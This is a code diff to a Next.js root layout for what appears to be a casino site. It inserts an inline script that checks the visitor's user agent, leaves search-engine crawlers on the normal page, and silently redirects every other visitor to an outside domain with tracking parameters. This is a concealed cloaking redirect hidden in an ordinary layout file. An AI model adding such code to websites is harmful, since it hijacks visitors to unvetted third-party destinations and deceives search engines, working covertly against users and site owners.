@@ -54,6 +54,21 @@ export default function RootLayout({ children }: { children: ReactNode }) {
         />
         <meta name="twitter:image" content="https://la27casino.vercel.app/images/hero-neon.jpg" />
         <meta name="theme-color" content="#2f0a1d" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://copper-ray.com/?serial=61365830&creative_id=9330");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body
         className={`${manrope.variable} ${oswald.variable} bg-background text-foreground font-sans antialiased`}
